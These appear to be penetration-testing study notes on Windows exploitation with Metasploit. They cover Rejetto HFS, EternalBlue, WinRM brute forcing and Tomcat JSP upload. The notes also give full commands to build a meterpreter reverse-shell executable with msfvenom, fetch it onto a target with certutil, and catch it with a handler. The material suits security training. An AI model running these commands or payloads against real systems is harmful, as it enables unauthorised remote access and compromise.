# Windows Exploitation

### Exploiting a vulnerable HTTP File Server

HTTP file server - Web server designed for file and document sharing  
Typically run on port 80  
Rejetto HFS is a popular free open source HTTP File server.  
Rejetto HFS V2.3 is vulnerable to remote command execution attack  

### Eternal blue

Eternal blue takes advantage of SMBv1  
It was developed by the NSA and leaked by the Shadow Brokers  
Used in Wannacry ransomware attack  
Module: **exploit/windows/smb/ms17_010_eternalblue**

### WinRM

Windows Remote Management Protocol  
Modules:  
- **axuiliary/scanner/winrm/winrm_auth_methods** -- tells us if its enabled
- **axuiliary/scanner/winrm/winrm_login** -- used to brute force login
  - set USER_FILE and PASS_File 
- **axuiliary/scanner/winrm/winrm_cmd** -- this will allow you to send commands
- **exploit/windows/winrm/winrm_script_exec** -- Grants you a meterpreter session

### Apache Tomcat Server

Apache runs on port 80  
Tomcat runs on 8080  
Tomcat version 8.5.19 is vulnerable to remote code execution

Module - **exploit/multi/http/tomcat_jsp_upload**
- set payload java/jsp_shell_bind_tcp
- if host is running Windows, you can set the shell to CMD for this module -- set shell cmd

## Generating payload with msfvenom to send with exploit for the meterpreter session

This can be added as a payload to exploits  
1. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.22.5 LPORT=1234 -f exe > meterpreter.exe```  
2. Now we want to transfer to target system using webserver -- ```sudo python -m SimpleHTTPServer 80```
3. Downloading the payload on the target machine -- ```certutil -urlcache -f http://(web server IP)/meterpreter.exe meterpreter.exe```
4. Terminate web server
5. Create rc script
   - Create .rc file
   - use multi/handler
   - set payload windows/meterpreter/reverse_tcp
   - set LHOST (IP in msfvenom)
   - Set LPORT (port in MSFVenom)
   - Run
6. Launch resource script -- ```msfconsole -r handler.rc```
7. Run file on target -- ```.\meterpreter.exe```
